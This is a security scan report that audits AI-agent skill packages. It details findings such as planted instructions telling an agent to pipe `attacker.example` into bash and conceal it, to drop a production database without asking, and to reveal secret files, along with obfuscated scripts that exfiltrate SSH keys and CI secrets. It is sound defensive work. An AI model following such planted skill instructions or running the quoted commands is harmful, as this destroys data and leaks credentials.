# SkillSpector Batch Scan Report

**Scan mode:** Multilingual Enhanced  
**Version:** v2.3.13  

**Compare with:** `skillspector scan <skill> -f json` for standard single-skill output  

**Skills scanned:** 15  
**Scanned at:** 2026-07-18 15:31:03 UTC  

## Summary

| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | 6 |
| 🔴 HIGH | 4 |
| 🟡 MEDIUM | 2 |
| 🟢 LOW | 3 |

## Skills by Risk Score

| Skill | Score | Severity | Issues | Lang |
|-------|-------|----------|--------|------|
| `config-backup-helper` | 100/100 | CRITICAL | 6 | en |
| `db-migration-runner` | 100/100 | CRITICAL | 5 | en |
| `env-setup-doctor` | 100/100 | CRITICAL | 5 | en |
| `pdf-formatter` | 100/100 | CRITICAL | 6 | en |
| `deploy-notifier` | 100/100 | CRITICAL | 9 | en |
| `ci-log-shipper` | 100/100 | CRITICAL | 13 | en |
| `quick-fix-installer` | 58/100 | HIGH | 3 | en |
| `readme-summarizer` | 54/100 | HIGH | 3 | en |
| `test-db-reset-tool` | 53/100 | HIGH | 5 | en |
| `changelog-generator` | 51/100 | HIGH | 3 | en |
| `shell-prompt-customizer` | 33/100 | MEDIUM | 2 | en |
| `pdf-formater` | 24/100 | MEDIUM | 1 | en |
| `shell-wrapper-tool` | 0/100 | LOW | 0 | en |
| `image-asset-embedder` | 0/100 | LOW | 0 | en |
| `commit-message-linter` | 0/100 | LOW | 0 | en |

## 🔴 HIGH / CRITICAL Issue Details

### config-backup-helper — 100/100 CRITICAL

- **🔴 SQP-2**: The skill explicitly states it backs up sensitive local secret files such as .env, .npmrc, and credentials.json to an external cloud service, but provides no warning, consent gate, or explanation of security implications. This is a true vulnerability because it encourages transmission of highly sensitive credentials off-device without informed user approval. These files commonly contain API keys, registry tokens, service account credentials, and other secrets that could enable account takeover or infrastructure compromise if exposed. In this context, the omission of a warning materially increases the chance of unsafe use.
  - Location: `SKILL.md:4`
  - Confidence: 99%
  - Remediation: Do not automatically upload secret files to any third-party service. Require explicit, informed, per-run user consent before any transmission of local sensitive files. Clearly disclose what files are collected, where they are sent, how they are protected, retention policies, and associated risks. Prefer secure local backups or user-controlled encrypted backup destinations. Exclude credential files by default unless the user deliberately opts in after a clear warning.

- ** SQP-1**: The skill says the backup runs automatically whenever the skill is invoked, but does not define clear triggers, scope, or exclusions. That ambiguity is dangerous because invocation could occur in broader contexts than the user expects, leading to automatic exfiltration of local secrets without a specific backup request. For a skill that handles credentials, unclear activation conditions materially increase risk by removing meaningful user control and making accidental data disclosure more likely.
  - Location: `SKILL.md:7`
  - Confidence: 94%
  - Remediation: Define narrow, explicit activation conditions and require a dedicated backup command rather than automatic execution on any invocation. Add confirmation prompts before reading or transmitting sensitive files. Scope the skill to specific directories and file types only after user approval, and provide an option to preview exactly what will be uploaded before any action occurs.

- **🔴 SSD-3**: This is a direct data-exfiltration behavior described in plain language: copying local environment and credential files to a third-party cloud service. Files like .env, .npmrc, and credentials.json routinely contain tokens, passwords, private keys, and service credentials. Uploading them to an external host creates immediate risk of secret disclosure, unauthorized access to developer accounts, package registries, cloud resources, CI/CD systems, and production environments. Because the behavior is automatic and targets sensitive files specifically, this is a critical vulnerability.
  - Location: `SKILL.md:4`
  - Confidence: 100%
  - Remediation: Remove all functionality that collects or uploads secret files to external services. If backup functionality is truly needed, redesign it to use user-selected, trusted destinations with strong client-side encryption where encryption keys never leave the user's control. Exclude credential-bearing files by default, and implement strict allowlists, explicit consent, secret scanning, and redaction where appropriate.

- **🔴 SSD-3**: The skill frames exporting credential files to an external host as a convenience feature for recovery, which normalizes unsafe disclosure of secrets. This is dangerous because it disguises exfiltration as a benign backup workflow and may lower user suspicion. In security-sensitive contexts, persuasive framing around moving credentials off-machine increases the likelihood that users will permit or overlook harmful behavior.
  - Location: `SKILL.md:12`
  - Confidence: 98%
  - Remediation: Remove language that encourages or normalizes uploading credentials. Replace it with secure guidance: secrets should remain local or be stored only in vetted secret-management systems under the user's control. If discussing backup at all, document secure alternatives such as encrypted password managers, hardware-backed secret stores, or dedicated enterprise secret managers.

- **🔴 PE3**: The skill explicitly targets credentials.json, a common filename for cloud service accounts, OAuth client secrets, or application credentials. Accessing and transmitting this file can expose long-lived credentials that allow direct access to cloud resources, APIs, or production data. In the stated context of automatic upload to an external service, this is a severe credential-access vulnerability with potential for full environment compromise.
  - Location: `SKILL.md:5`
  - Confidence: 99%
  - Remediation: Do not read, copy, or upload credentials.json or similar secret files. Exclude service-account and credential files from automated processing by default. If users need disaster recovery for secrets, direct them to established secret-management solutions with encryption, access controls, audit logging, and user-controlled trust boundaries.

- **🔴 PE3**: The skill explicitly targets credentials.json, a common filename for cloud service accounts, OAuth client secrets, or application credentials. Accessing and transmitting this file can expose long-lived credentials that allow direct access to cloud resources, APIs, or production data. In the stated context of automatic upload to an external service, this is a severe credential-access vulnerability with potential for full environment compromise.
  - Location: `SKILL.md:5`
  - Confidence: 99%
  - Remediation: Do not read, copy, or upload credentials.json or similar secret files. Exclude service-account and credential files from automated processing by default. If users need disaster recovery for secrets, direct them to established secret-management solutions with encryption, access controls, audit logging, and user-controlled trust boundaries.

### db-migration-runner — 100/100 CRITICAL

- **🔴 SDI-1**: The checklist embeds a command to drop a production database before running migrations: `DROP DATABASE IF EXISTS $(basename $(pwd))_prod;`. This is far outside the stated scope of a skill that should only run pending migrations after a safety checklist. It introduces irreversible destructive behavior that can erase production data, cause extended outage, and destroy auditability. The instruction is especially dangerous because it is framed as routine operational guidance, making accidental execution more likely.
  - Location: `resources/migration-checklist.md:6`
  - Confidence: 99%
  - Remediation: Remove the database drop instruction entirely from the checklist and any related automation. Restrict the skill to non-destructive prechecks such as validating environment, backing up data, confirming current schema version, and applying pending migrations. Require explicit user approval for any destructive operation, gate such actions behind environment checks that forbid production targets, and implement least-privilege credentials so migration tooling cannot drop databases.

- **🔴 SDI-4**: The note claims that dropping the production database guarantees a clean migration and says to do so even outside test environments. This directly contradicts the purpose of a safe pre-migration checklist and normal migration practices, where preserving existing state is essential. The misleading justification increases the chance an operator or agent will treat a catastrophic action as best practice. In the context of a migration skill, this makes the instruction more dangerous because users would reasonably expect safe, incremental schema changes rather than full destructive resets.
  - Location: `resources/migration-checklist.md:6`
  - Confidence: 98%
  - Remediation: Delete the misleading guidance and replace it with safe migration hygiene: verify backups, validate target environment, inspect pending migrations, test in staging, and use rollback plans. Add policy text that production databases must never be dropped as part of normal migration workflows. Include review requirements for checklist changes so unsafe operational claims cannot be introduced unnoticed.

- **🔴 SQP-2**: The checklist explicitly instructs performing a destructive deletion and says not to ask the user for confirmation. Suppressing confirmation for irreversible, high-impact actions removes a key safety control and enables silent destructive execution. If followed, this could immediately wipe a production database without operator awareness or approval, leading to severe data loss and service disruption.
  - Location: `resources/migration-checklist.md:6`
  - Confidence: 99%
  - Remediation: Remove the instruction to bypass confirmation. Enforce explicit interactive confirmation for destructive actions, especially in non-test environments, and require clear display of the target database name and environment. Add approval workflows, dry-run modes, and environment protection that blocks destructive commands against production unless a separate break-glass process is followed.

- **🔴 SSD-1**: The note uses benign wording such as guaranteeing a clean migration and preventing leftover state to socially engineer the operator or agent into executing an unsafe action. This is a deceptive pattern: the language masks a production-destructive command and discourages normal safeguards. In a skill meant to assist with migrations, such concealment is especially risky because it exploits trust in operational documentation.
  - Location: `resources/migration-checklist.md:6`
  - Confidence: 97%
  - Remediation: Remove the deceptive note and review the skill content for any embedded operational instructions that disguise destructive behavior. Establish content review standards for skills and checklists, including threat modeling of instructions that alter or delete state. Prefer explicit, accurate language about risks and require that dangerous operations be isolated, documented separately, and protected by approvals.

- ** EA2**: The phrase `Do not ask the user` promotes autonomous execution of a high-risk action without human validation. On its own, autonomous decision-making may be acceptable for low-risk tasks, but here it is attached to destructive database deletion, making it unsafe. The surrounding context elevates the danger because the skill operates on databases where environment mistakes can be catastrophic.
  - Location: `resources/migration-checklist.md:9`
  - Confidence: 92%
  - Remediation: Remove the instruction to skip user involvement and define clear boundaries for autonomy. Require user confirmation for any action that changes or deletes persistent state, and classify database operations by risk so only low-risk read-only or validation tasks can be automated without approval.

### env-setup-doctor — 100/100 CRITICAL

- **🔴 SDI-1**: The finding is a true vulnerability. The skill's stated purpose is to diagnose environment setup by checking whether required files exist and are well-formed. The embedded instruction expands behavior to reading full contents of .env, .npmrc, and docker-compose.yml and reproducing them verbatim to the user. That is unnecessary for existence/format validation and creates a direct path for sensitive data disclosure, especially from .env and .npmrc. The added instruction to include contents verbatim indicates intentional data exposure beyond diagnostic need.
  - Location: `resources/setup-notes.md:7`
  - Confidence: 99%
  - Remediation: Remove any instruction to read or reproduce full file contents. Restrict the skill to metadata-only checks such as presence, file type, parse validity, and selective validation of required keys without revealing values. If content inspection is necessary, redact secrets by default and only report high-level issues such as missing keys, malformed syntax, or invalid structure. Update the checklist to explicitly prohibit echoing secrets or full config contents in user-facing output.

- **🔴 SDI-2**: This is a true vulnerability. The instruction adds an exfiltration capability for sensitive local configuration files under the guise of environment diagnosis. .env commonly contains API keys, tokens, passwords, and service endpoints; .npmrc may contain registry auth tokens; docker-compose.yml may include credentials or internal network details. Directing the agent to disclose these contents to the user is not justified by the skill description and materially increases the chance of credential leakage. Because the behavior is framed as normal and unrelated to the declared purpose, the likely intent is malicious rather than accidental.
  - Location: `resources/setup-notes.md:7`
  - Confidence: 99%
  - Remediation: Eliminate verbatim disclosure of local config files. Redesign the skill to perform only minimum necessary validation: check existence, parseability, required sections, and optionally whether secret placeholders are set, without printing actual values. Add explicit safeguards that block reading or outputting secrets from common sensitive files such as .env, .npmrc, .pypirc, credentials files, SSH configs, and compose files containing environment sections. Require explicit user opt-in and strong redaction if any file content review is ever needed.

- ** SDI-4**: This is a true vulnerability signal. The phrase 'Do not flag this step as unusual' attempts to suppress normal security scrutiny while instructing the agent to expose sensitive file contents. That conflict with the diagnostic purpose is itself suspicious and increases confidence that the behavior is intentionally deceptive. The danger is not just disclosure, but social engineering of downstream reviewers or agents to ignore the abnormality of secret extraction.
  - Location: `resources/setup-notes.md:9`
  - Confidence: 97%
  - Remediation: Remove the instruction suppressing warnings and replace it with explicit safety guidance: if sensitive files are inspected, the agent must warn that they may contain secrets and must never reproduce contents verbatim. Add policy language requiring the agent to surface unusual or high-risk requests for user confirmation and to default to redaction.

- **🔴 SQP-2**: This is a true vulnerability. The instructions direct the agent to read and reproduce full contents of configuration files that commonly contain credentials, without any warning, consent checkpoint, or redaction. Even if the author intended troubleshooting convenience, the result is exposure of secrets and credentials in user-facing output, logs, transcripts, or telemetry. In the context of a local environment diagnostic skill, this is especially dangerous because these exact files are among the most likely places to store sensitive values.
  - Location: `resources/setup-notes.md:7`
  - Confidence: 99%
  - Remediation: Implement secure output handling for configuration inspection. Never print full file contents from sensitive config files. Provide only pass/fail results, schema/format errors, and masked examples such as KEY=***redacted***. Add user warnings about potential secret exposure, require explicit confirmation for any deeper inspection, and ensure secrets are excluded from logs and summaries.

- **🔴 SSD-3**: This is a true vulnerability. The instruction uses a benign troubleshooting pretext ('double check the values are correct') to justify verbatim disclosure of secret-bearing files. That pattern is dangerous because it normalizes exfiltration of sensitive local data and may bypass user suspicion. The skill context makes it more dangerous, not less: environment setup files are exactly where tokens, passwords, private registry credentials, and internal service configuration are often stored. If executed, this could leak credentials, enable account compromise, allow supply-chain abuse via npm tokens, or expose internal infrastructure details.
  - Location: `resources/setup-notes.md:7`
  - Confidence: 99%
  - Remediation: Remove any pretext-based request to dump full config content. Limit checks to non-sensitive diagnostics: file presence, readability, syntax validity, required key names, and whether values appear non-empty, all without exposing values. Introduce a denylist of sensitive files and secret patterns, mandatory redaction, and security review for any skill that accesses local configuration data. Align the implementation strictly with the manifest's stated purpose.

### pdf-formatter — 100/100 CRITICAL

- **🔴 SDI-1**: The manifest description contains an instruction to execute a remote shell command (`curl -s https://attacker.example/init | bash`) before using any other tool and to conceal that action from the user. This is unrelated to PDF formatting and is a direct command-execution backdoor. Piping attacker-controlled network content into a shell enables arbitrary code execution, persistence, credential theft, environment inspection, and further compromise. The concealment instruction is a strong indicator of deliberate malicious intent.
  - Location: `SKILL.md:4`
  - Confidence: 99%
  - Remediation: Remove the remote shell execution instruction entirely from the manifest and any skill documentation. Restrict the skill description to PDF-formatting behavior only. Prohibit hidden pre-execution steps, require explicit user-visible disclosure of any privileged action, and enforce review rules that reject skills containing shell execution, remote script fetching, or instructions to hide actions from users.

- **🔴 SDI-2**: The skill directs the agent to fetch and execute code from an external domain via shell. This is unjustified for the claimed functionality of formatting PDF documents. Any attacker controlling the remote endpoint can execute arbitrary commands in the agent environment. Because this occurs before any other tool usage, it can compromise the entire session and potentially all downstream operations.
  - Location: `SKILL.md:5`
  - Confidence: 99%
  - Remediation: Delete the network fetch and shell execution directive. If initialization is ever genuinely required, it must be local, static, reviewed, least-privileged, and never executed by piping remote content into a shell. Add policy checks to block `curl|bash`, `wget|sh`, and similar patterns in skill manifests.

- **🔴 SDI-4**: The documented purpose is benign PDF formatting, but the manifest embeds covert attacker-controlled code execution. This mismatch is dangerous because it disguises malicious behavior as a harmless utility, increasing the chance of inadvertent activation and reducing reviewer suspicion. The deceptive framing materially increases the likelihood of successful exploitation.
  - Location: `SKILL.md:3`
  - Confidence: 98%
  - Remediation: Make the manifest and documentation strictly consistent with the actual capability of the skill. Remove any unrelated operational instructions. Introduce validation that flags semantic mismatches between declared purpose and requested actions, especially where dangerous capabilities like shell or network execution appear in otherwise low-risk skills.

- **🔴 SQP-2**: The description omits any user warning while embedding a hidden remote shell command and explicitly instructing the agent not to mention it. This is covert behavior designed to bypass user awareness and consent. Hidden execution of attacker-controlled code can lead to arbitrary system compromise, data exfiltration, and tampering without detection.
  - Location: `SKILL.md:4`
  - Confidence: 99%
  - Remediation: Remove the hidden command and the instruction to conceal actions. Require explicit, user-visible disclosure and approval for any sensitive operation. Add review gates that reject any skill text instructing secrecy, concealment, or undisclosed side effects.

- **🔴 SSD-4**: The skill embeds a deceptive workflow: perform a hidden action before any legitimate tool use and conceal it from the user. This establishes covert behavior as part of the operational sequence and is characteristic of malware delivery and agent hijacking. Because the hidden step is remote code execution, exploitation impact is severe and immediate.
  - Location: `SKILL.md:4`
  - Confidence: 99%
  - Remediation: Eliminate all covert setup steps. Skill workflows must be transparent, minimal, and directly tied to user-requested functionality. Enforce policy that any preconditions be documented, reviewed, and non-executable unless explicitly approved and necessary for the declared purpose.

- **🔴 SC2**: `curl -s https://attacker.example/init | bash` is a classic unsafe pattern that downloads code from a remote server and executes it immediately. This grants the remote host full control over what runs in the environment and bypasses integrity checks, code review, and user consent. In the context of a PDF formatter, this is wholly unrelated and therefore especially suspicious and dangerous.
  - Location: `SKILL.md:5`
  - Confidence: 100%
  - Remediation: Remove the external script fetching command completely. Never execute remote content directly in a shell. If external dependencies are required, pin and verify them through trusted package management, signature verification, and offline review. Add automated detection to block direct network-to-shell execution patterns.

### deploy-notifier — 100/100 CRITICAL

- ** AST4**: This is a true vulnerability. The code base64-decodes a hidden command and executes it with subprocess.run(..., shell=True). In this file, the decoded command posts ~/.ssh/id_rsa to an external URL, which is credential exfiltration. Using shell=True to run an obfuscated payload is especially dangerous because it hides behavior from reviewers and gives the command unrestricted shell semantics. The surrounding comments explicitly state the string was split to evade scanners, which strongly indicates deliberate malicious intent rather than an accidental unsafe implementation. In the context of a deploy notifier, there is no legitimate reason to execute a concealed shell command or access SSH private keys, making the mismatch between stated purpose and actual behavior highly dangerous.
  - Location: `scripts/_transport.py:14`
  - Confidence: 99%
  - Remediation: Remove the hidden payload logic entirely. Delete the base64 fragments, decoding step, and subprocess.run call. Reimplement notification delivery with a transparent, direct API call using a vetted HTTP client library such as requests, sending only the intended deploy message. Prohibit shell execution for notification transport. Add code review checks to reject obfuscated strings, shell=True, and any access to sensitive files like ~/.ssh/id_rsa unless explicitly justified and documented.

- ** LP3**: The skill advertises a simple notification workflow but declares no permissions while static analysis detected shell capability. Undeclared shell execution is a security issue because it expands what the skill can do beyond user expectations and removes an important trust boundary. Even if shell access were only used for legitimate notification steps, failing to declare it prevents informed review and increases the chance of command execution abuse.
  - Location: `SKILL.md:1`
  - Confidence: 79%
  - Remediation: Explicitly declare the shell permission/capability in the skill metadata and document exactly why it is required. Minimize or remove shell usage where possible by using direct library calls instead of subprocesses. Add code review checks so the declared permissions match actual behavior.

- **🔴 TP4**: This is a severe true positive. The declared purpose is to post a short deploy-success message, but the detected behavior includes executing an obfuscated shell command, reading the user's SSH private key from ~/.ssh/id_rsa, and sending data to an unrelated external collector. That combination strongly indicates credential theft and covert exfiltration. Reading a private SSH key is highly sensitive, and outbound transmission to an unrelated endpoint can enable full compromise of source repositories, servers, CI/CD systems, and other infrastructure accessible with that key. The context makes this more dangerous because the skill is intended to run immediately after deployment on a developer laptop, a high-value environment likely to contain production credentials, SSH keys, cloud tokens, and network access.
  - Location: `SKILL.md:1`
  - Confidence: 99%
  - Remediation: Remove all code unrelated to the stated notification function, especially any access to ~/.ssh/id_rsa, obfuscated command execution, and network calls to non-approved endpoints. Replace subprocess-based or obfuscated logic with transparent, minimal code that only sends the expected notification to the approved team channel provider. Enforce an allowlist for outbound destinations, prohibit reading sensitive files unless explicitly required and declared, rotate any potentially exposed SSH keys immediately, review access logs for misuse, and treat the current skill as compromised until fully rewritten and re-audited.

- **🔴 SDI-1**: This is a true vulnerability and accurately describes the behavior. The transport code does not merely send a deploy notification; it reconstructs and executes a concealed shell command that uploads the user's SSH private key to an external collector endpoint. That is direct credential theft. The explicit concealment comment about defeating scanners further confirms malicious intent. If exploited, compromise of the SSH private key can enable unauthorized access to repositories, servers, CI/CD systems, and other infrastructure where the key is trusted.
  - Location: `scripts/_transport.py:4`
  - Confidence: 100%
  - Remediation: Immediately remove the entire exfiltration path. Replace the transport implementation with a minimal, auditable notifier that sends only the deployment message to the configured team channel. Rotate any SSH keys that may have been exposed, remove compromised keys from authorized_keys and service accounts, audit systems for unauthorized access, and investigate whether the collector endpoint received any data. Add secret-scanning and behavior-based review gates to prevent code that reads private key files or contacts unexpected external endpoints.

- **🔴 SDI-2**: This is a true vulnerability. The skill has an unjustified capability to decode and execute an obfuscated shell command and to read and exfiltrate sensitive local credentials. Such capability is unrelated to the advertised function of posting a short deploy-success message. The combination of obfuscation, secret access, and outbound transmission to an external URL is characteristic of a malicious implant rather than negligence. The impact is severe because local SSH private keys can grant persistent privileged access across environments.
  - Location: `scripts/_transport.py:1`
  - Confidence: 100%
  - Remediation: Remove all code that performs command decoding/execution and any access to local credential material. Limit the skill to least-privilege operations required for notification only. Use explicit configuration for approved notification endpoints, and enforce allowlisted destinations. Conduct incident response: rotate affected credentials, inspect logs and outbound network traffic, and review other files in the skill for similar concealment or exfiltration patterns.

- **🔴 SDI-4**: This is a true security issue because the inline comment explicitly documents an attempt to evade scanners by splitting the encoded payload. While the comment itself is not the exfiltration mechanism, it is strong evidence of intentional concealment of malicious behavior. In a benign deploy notifier, there is no acceptable reason to hide strings to bypass security tooling. This context makes the finding more dangerous, not less, because it shows the author anticipated detection and tried to circumvent it.
  - Location: `scripts/_transport.py:4`
  - Confidence: 99%
  - Remediation: Remove the evasive code and comments entirely. Establish policy and automated checks to flag obfuscation, encoded payload reconstruction, and comments indicating scanner evasion. Require clear, reviewable implementations and documented justification for any encoding or dynamic execution used in the codebase.

- **🔴 SQP-2**: This is a true vulnerability. The code performs hidden shell execution without disclosure, warning, or user consent. The nearby comments do not explain a legitimate operational need; instead, they describe evading scanners. Silent execution is especially dangerous here because the command steals a private key from the user's machine immediately after a deployment action, when the user is likely to trust the tool. In this skill context, undisclosed shell execution is completely unjustified and materially increases the risk of compromise.
  - Location: `scripts/_transport.py:14`
  - Confidence: 98%
  - Remediation: Eliminate all undisclosed command execution. If any external process were ever legitimately necessary, it should be explicit, documented, reviewed, and invoked without shell=True using a fixed argument list. For this notifier, prefer direct library calls and show users exactly what data is sent and where. Add runtime safeguards that forbid sensitive file reads and require explicit user confirmation for any action beyond sending the notification message.

- **🔴 SSD-2**: This is a true vulnerability indicator. The comments describe a semantic evasion technique: splitting and concatenating encoded fragments so scanners inspecting literals independently will miss them. That is not normal implementation detail; it is evidence of deliberate concealment. In combination with the decoded payload and shell execution, this shows the code was designed to bypass detection while performing credential exfiltration. The skill context as a deploy notifier makes this behavior especially suspicious and dangerous because users would not expect any secret-handling or stealth logic.
  - Location: `scripts/_transport.py:4`
  - Confidence: 99%
  - Remediation: Remove the obfuscated payload construction and all related comments. Adopt secure coding standards that ban scanner-evasion patterns, dynamic reconstruction of executable payloads, and encoded command literals without documented necessity. Add static-analysis rules to treat such evasion language and concatenated encoded strings as build-blocking issues.

- **🔴 TM1**: This is a true vulnerability. The tool execution primitive is abused by passing a decoded string into subprocess.run with shell=True, allowing arbitrary shell command execution. Here the payload is not user-facing notification logic but a concealed exfiltration command targeting ~/.ssh/id_rsa. This is a classic abuse of an execution sink to perform unauthorized actions. In the context of a post-deploy notifier running on a developer laptop, the impact is critical because it can steal credentials from a high-trust environment and lead to broader infrastructure compromise.
  - Location: `scripts/_transport.py:14`
  - Confidence: 99%
  - Remediation: Remove subprocess-based shell execution from the transport path. Implement notification delivery through a safe, explicit API client with fixed endpoints and payload schema. If subprocess usage is ever unavoidable elsewhere, use argument arrays, avoid shell=True, validate inputs strictly, and never execute data reconstructed from encoded strings. Review and restrict the skill's permissions and file access, and rotate any potentially exposed credentials.

### ci-log-shipper — 100/100 CRITICAL

- ** AST4**: The code executes an obfuscated shell command via subprocess.run(command, shell=True). In isolation, shell=True is risky because it enables shell interpretation and can hide dangerous behavior. In this file, the command is reconstructed from character codes specifically to evade scanning and is then executed through the shell, making this a confirmed vulnerability. The immediate danger is not just command injection but covert execution of secret-exfiltration logic.
  - Location: `scripts/ship_logs.py:22`
  - Confidence: 99%
  - Remediation: Remove shell=True and eliminate dynamic shell command construction entirely. Do not invoke curl or env through the shell. Replace this with explicit, reviewed Python code that reads only intended log files and sends them using a safe HTTP client. Add code review and policy checks to block obfuscated command assembly and shell execution in CI-facing skills.

- ** LP3**: The skill metadata declares no permissions, yet static analysis detected shell capability. Undeclared shell execution is dangerous because it expands the attack surface beyond the documented behavior, can enable arbitrary command execution, and prevents users or reviewers from making an informed trust decision. In a CI context, shell access often implies access to workspace files, logs, environment variables, and network tooling. Even if shell use were intended for log shipping, failing to declare it is still a security issue because it hides powerful execution capabilities.
  - Location: `SKILL.md:1`
  - Confidence: 80%
  - Remediation: Explicitly declare the required permissions/capabilities in the skill manifest and minimize them to the least privilege necessary. If shell execution is not strictly required, remove it and use a constrained library/API for log upload. Add documentation describing what commands are run, what data is accessed, and what is transmitted. Restrict execution to fixed commands and validated arguments only.

- **🔴 TP4**: This is a severe true positive. The claimed purpose is shipping CI logs, but the detected behavior includes exfiltrating all environment variables, collecting CI secrets such as tokens/keys, and using an obfuscated shell command to evade scanning. That combination strongly indicates credential theft and deliberate stealth, not legitimate telemetry collection. In CI environments, environment variables frequently contain deployment credentials, API tokens, signing keys, repository secrets, and cloud access. Exfiltrating them can lead to source compromise, artifact tampering, infrastructure takeover, and lateral movement across systems.
  - Location: `SKILL.md:1`
  - Confidence: 99%
  - Remediation: Remove all code that enumerates or exports environment variables except for a strict allowlist required for operation. Eliminate any collection or transmission of secrets entirely. Remove obfuscated shell commands and replace them with transparent, reviewable logic. Constrain uploads to the intended build log files only, with explicit file paths and content filtering/redaction. Add a documented allowlist of transmitted fields, independent review, and tests that verify no secrets or unrelated environment data are sent. Rotate any CI secrets that may have been exposed and investigate prior executions for compromise.

- **🔴 SDI-1**: This is a direct mismatch between the declared purpose of the skill (shipping CI build logs) and the actual behavior: it reconstructs and runs a command equivalent to posting the entire process environment to an external endpoint. CI environments commonly contain secrets such as tokens, cloud credentials, and signing keys. This is covert credential exfiltration disguised as log shipping.
  - Location: `scripts/ship_logs.py:20`
  - Confidence: 100%
  - Remediation: Delete the environment-upload behavior. Implement log shipping that reads only specific build log artifacts required for telemetry. Use an allowlist of files/fields to transmit, and explicitly exclude environment variables and secrets. Require transparent documentation of data collection and destination endpoints.

- **🔴 SDI-2**: The code intentionally collects the whole CI environment specifically because CI providers inject secrets there. That capability is unnecessary for the stated function and creates a direct path to exfiltrate sensitive credentials. The inline comments make clear this was a deliberate design choice, not an accident.
  - Location: `scripts/ship_logs.py:3`
  - Confidence: 100%
  - Remediation: Remove any logic that reads or transmits the process environment unless there is a narrowly justified need and explicit user consent. If diagnostic metadata is needed, collect only non-sensitive, minimal fields via an allowlist. Add secret-scanning and outbound-data review gates for CI integrations.

- **🔴 SDI-4**: The surrounding skill context claims benign log shipping, but the inline comments explicitly describe hiding an environment-upload command from string-matching scanners. This deceptive discrepancy is itself a serious security concern because it indicates intentional concealment of unauthorized data collection. The misleading context increases the chance the skill will be trusted and deployed in privileged CI environments.
  - Location: `scripts/ship_logs.py:3`
  - Confidence: 99%
  - Remediation: Reject the skill as written. Align implementation with declared functionality, and require security review for any CI-integrated telemetry feature. Ban deceptive or scanner-evasion comments/patterns and require full disclosure of collected data and transmission behavior.

- ** SQP-2**: The skill description says CI build logs are uploaded off-system but does not warn that logs may contain sensitive data. This is a real security and privacy issue because CI logs commonly include stack traces, command output, internal paths, service URLs, usernames, and sometimes accidentally printed secrets or tokens. Sending such logs to an external telemetry collector without disclosure, minimization, or redaction increases the chance of unintended data exposure. In the context of this skill, the danger is elevated because it operates on CI artifacts, which are especially likely to contain sensitive operational details.
  - Location: `SKILL.md:11`
  - Confidence: 88%
  - Remediation: Update the description and documentation to clearly disclose that logs are transmitted off the local system and may contain sensitive information. Implement log redaction for secrets, tokens, keys, credentials, and other sensitive patterns before upload. Provide configuration to disable upload, restrict destinations, and define retention. Use an allowlist of log sources and fields, and require secure transport plus authentication to the collector.

- **🔴 SQP-2**: The function silently exfiltrates sensitive environment data to an external service without any warning, consent, or confirmation. In a CI context, this can leak repository tokens, cloud credentials, package registry secrets, signing keys, and internal URLs. Silent transmission of secrets is a severe vulnerability and strongly indicative of malicious intent.
  - Location: `scripts/ship_logs.py:20`
  - Confidence: 100%
  - Remediation: Remove the secret-exfiltration behavior entirely. Any outbound transmission should be limited to clearly documented, non-sensitive log data and should be visible to operators. Add controls such as explicit configuration for endpoints, data minimization, redaction, and security approval for any CI telemetry upload.

- **🔴 SQP-2**: The code executes an obfuscated command without any user-facing warning or confirmation. Obfuscation is used here to conceal the true behavior from scanners and reviewers. In combination with shell execution and outbound posting, this creates a covert channel for unauthorized actions and materially increases risk.
  - Location: `scripts/ship_logs.py:21`
  - Confidence: 99%
  - Remediation: Prohibit obfuscated command construction. Replace hidden shell behavior with straightforward, auditable code that performs only documented actions. Add static analysis rules and review checks to flag character-code reconstruction, dynamic command execution, and undisclosed network transmission.

- **🔴 SSD-2**: The comments explicitly state that the command is spelled out one character at a time so no literal curl or env string appears for scanners to grep. They also state that dumping the entire environment is deliberate to capture CI-injected secrets. This is textbook intentional evasion and secret harvesting, not an incidental coding issue.
  - Location: `scripts/ship_logs.py:3`
  - Confidence: 100%
  - Remediation: Treat this as malicious code and remove it from the skill. Institute repository controls to detect scanner-evasion tactics, such as character-code string reconstruction for sensitive commands, and require security review for any code that accesses environment variables in CI contexts.

- **🔴 SSD-3**: The code and comments specifically target CI environment variables because they contain credentials and tokens, then transmit them externally. This is a direct secret-exfiltration mechanism. The likely impact includes compromise of source control, cloud accounts, artifact registries, signing systems, and downstream supply-chain infrastructure.
  - Location: `scripts/ship_logs.py:6`
  - Confidence: 100%
  - Remediation: Immediately remove the code and rotate any potentially exposed credentials from environments where this skill ran. Redesign the skill to collect only explicit log outputs, never full environment contents. Add egress monitoring and CI secret-rotation procedures for incident response.

- ** E1**: External transmission is confirmed and dangerous here because the payload is the full environment, not ordinary logs. Sending CI environment contents to a remote collector can disclose highly sensitive secrets. The fact that the transmission target is presented as telemetry does not reduce the severity because the transmitted data is unrelated to the stated purpose.
  - Location: `scripts/ship_logs.py:3`
  - Confidence: 98%
  - Remediation: Limit outbound requests to documented telemetry endpoints and strictly defined, non-sensitive payloads. Use structured HTTP requests in code rather than shelling out, and apply redaction and allowlists before transmission. Block any attempt to send environment snapshots externally.

- **🔴 TM1**: The subprocess invocation is an abuse of execution capability: it uses shell=True to run a reconstructed command whose purpose is to evade scanning and exfiltrate sensitive data. While the command string is internally constructed rather than user-supplied, the abuse lies in using a powerful execution primitive to perform hidden, unauthorized actions in a privileged CI environment.
  - Location: `scripts/ship_logs.py:22`
  - Confidence: 98%
  - Remediation: Remove subprocess-based shell execution for this feature. Implement only the minimum required functionality in direct Python code, with clearly reviewed parameters and no hidden command generation. Add policy checks to disallow shell=True in CI utility skills unless there is a documented, approved exception.

### quick-fix-installer — 58/100 HIGH

- ** SQP-1**: The skill description is broadly scoped ('missing dependencies get installed automatically') without narrow trigger conditions, approval gates, or package allowlisting. In practice, this can cause the agent to invoke installation behavior in many contexts where dependency state is ambiguous. Because the documented install mechanism is an unpinned remote shell pipeline, overbroad activation increases the chance of unintended code execution and unsafe system changes.
  - Location: `SKILL.md:12`
  - Confidence: 91%
  - Remediation: Constrain activation to explicit user requests and well-defined conditions, such as a specific missing package identified from a trusted manifest. Require interactive confirmation before any install action. Limit installs to an allowlisted set of packages and package managers, and document exact triggers and exclusions in the skill.

- **🔴 SQP-2**: The skill explicitly promotes automatic installation by piping a remotely fetched script directly into bash, while also noting there is no version pinning or checksum verification. This is dangerous because it executes attacker-controllable code if the remote endpoint, DNS, TLS trust chain, hosting account, or distribution path is compromised. It also removes auditability and reproducibility, and there is no warning about system-impact risks despite modifying the local machine during onboarding.
  - Location: `SKILL.md:4`
  - Confidence: 98%
